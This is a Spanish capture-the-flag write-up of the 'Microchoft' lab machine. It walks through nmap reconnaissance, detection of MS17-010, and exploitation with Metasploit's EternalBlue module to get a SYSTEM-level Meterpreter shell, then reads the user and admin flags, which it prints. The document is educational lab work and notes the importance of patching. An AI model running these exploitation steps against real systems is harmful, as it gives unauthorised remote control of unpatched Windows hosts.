# 💀 Microchoft - The Hackers Labs(Intermediate)

## 📋 Info

| Campo | Detalle |
|---|---|
| Máquina | Microchoft |
| Plataforma | The Hacker Labs|
| Dificultad | Intermediate |
| OS | Windows 7 SP1 x64 |
| IP | 192.168.0.21 (variable) |
| CVE | CVE-2017-0143 (MS17-010 EternalBlue) |

---

## 🔍 Reconocimiento

```bash
sudo arp-scan -l
```

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn 192.168.0.21
```

**Puertos abiertos:**
- 135/tcp → MSRPC
- 139/tcp → NetBIOS
- 445/tcp → SMB (Windows 7 Home Basic 7601 SP1)
- 49152-49158/tcp → MSRPC dinámico

**Datos clave del escaneo:**
- OS: Windows 7 Home Basic 7601 Service Pack 1
- Hostname: MICROCHOFT
- SMB signing: disabled (peligroso)
- Workgroup: WORKGROUP

---

## 🔎 Análisis de Vulnerabilidades

```bash
nmap -p445 --script vuln 192.168.0.21
```

**Resultado crítico:**
```
smb-vuln-ms17-010: VULNERABLE
Remote Code Execution vulnerability in Microsoft SMBv1 servers
CVE: CVE-2017-0143
Risk factor: HIGH
```

**MS17-010 EternalBlue** — vulnerabilidad crítica en SMBv1 desarrollada por la NSA, 
filtrada por Shadow Brokers en 2017 y usada por WannaCry para infectar 200,000+ 
sistemas en 150 países en 24 horas.

---

## ⚔️ Explotación — EternalBlue (MS17-010)

```bash
msfconsole
```

Dentro de Metasploit:

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.0.21
set LHOST 192.168.0.25
run
```

**Output:**
```
[+] 192.168.0.21:445 - Host is likely VULNERABLE to MS17-010!
[+] 192.168.0.21:445 - The target is vulnerable.
[+] 192.168.0.21:445 - Connection established for exploitation.
[*] Meterpreter session opened
```

---

## 💥 Post-Explotación

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : MICROCHOFT
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
System Language : en_US
```

**NT AUTHORITY\SYSTEM** — nivel máximo de privilegios en Windows. Equivalente a root en Linux.

### Enumeración de usuarios

```
shell
cd C:\Users
dir
```

```
Admin
Lola
Public
```

### Obtención de flags

```
type C:\Users\Admin\Desktop\admin.txt.txt
type C:\Users\Lola\Desktop\user.txt
```

**Flag Admin:** `ff4ad2daf333183677e02bf8f67d4dca`
**Flag User (Lola):** `13e624146d31ea232c850267c2745caa`

---

## 🗺️ Cadena de Ataque

1. **arp-scan** → descubre IP `192.168.0.21`
2. **nmap** → Windows 7 SP1 con SMB 445 abierto
3. **nmap --script vuln** → detecta MS17-010 EternalBlue
4. **Metasploit** `ms17_010_eternalblue` → Meterpreter shell
5. **NT AUTHORITY\SYSTEM** → acceso total sin credenciales
6. **Flags** en Desktop de Admin y Lola

---

## 🛠️ Herramientas Usadas

- `nmap` — reconocimiento y detección de vulnerabilidades
- `arp-scan` — descubrimiento de IP
- `metasploit` — explotación con EternalBlue

---

## 📚 Técnicas Aprendidas

- **SMB enumeration** — detectar versión SMB y configuración
- **Vulnerability scanning** — `nmap --script vuln` para detectar CVEs
- **EternalBlue MS17-010** — RCE en SMBv1 sin credenciales
- **Meterpreter** — shell avanzada de Metasploit para Windows
- **NT AUTHORITY\SYSTEM** — máximo privilegio en Windows

---

## ⚠️ Contexto Histórico

MS17-010 fue desarrollado por la **NSA** como arma cibernética. En abril 2017 el grupo 
**Shadow Brokers** filtró el arsenal completo de la NSA. Semanas después el ransomware 
**WannaCry** (atribuido a Corea del Norte) lo usó para infectar sistemas en 150 países, 
afectando hospitales (NHS UK), empresas (Telefónica, Renault) e infraestructuras críticas.

Microsoft lanzó el parche MS17-010 en marzo 2017, pero millones de sistemas sin actualizar 
seguían siendo vulnerables. Esto demuestra la importancia crítica de mantener sistemas 
actualizados.
